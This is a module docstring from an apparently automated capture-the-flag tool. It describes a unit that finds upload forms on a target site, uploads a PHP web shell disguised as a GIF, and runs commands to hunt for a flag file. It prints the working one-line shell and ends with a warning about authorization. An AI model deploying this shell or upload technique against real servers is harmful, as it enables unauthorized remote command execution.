"""
Upload a basic PHP web shell to look for a flag file.

This unit will to see if there upload functionality on a webpage, and if it
finds one, it will attempt to upload a basic PHP web shell masked inside of
a GIF image. That syntax is simply:

.. code:: php

    GIF89a;
    <?php system($_GET['c']) ?>


If the unit can find the new file that it uploaded, it will attempt to run 
commands and look for a ``flag.txt`` or ``flag`` file on the remote server.

This unit inherits from :class:`katana.units.web.WebUnit` as that contains
lots of predefined variables that can be used throughout multiple web units.

.. warning::
    
    This unit automatically attempts to perform malicious actions on the 
    target. **DO NOT** use this in any circumstances where you do not have the
    authority to operate!
